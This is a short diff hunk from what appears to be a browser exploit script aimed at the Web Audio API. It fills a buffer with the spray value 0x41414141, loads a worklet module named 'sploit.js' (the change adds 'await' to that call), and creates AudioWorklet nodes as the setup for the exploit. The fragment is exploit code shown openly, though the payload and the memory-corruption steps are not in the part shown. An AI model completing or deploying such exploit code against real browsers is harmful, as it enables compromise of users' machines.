@@ -47,7 +47,7 @@ let inputBufferU32 = new Uint32Array(inputBuffer.getChannelData(0).buffer);
             
 inputBufferU32.fill(0x41414141);
 
-audioCtx.audioWorklet.addModule("sploit.js");
+await audioCtx.audioWorklet.addModule("sploit.js");
 
 let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
 let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
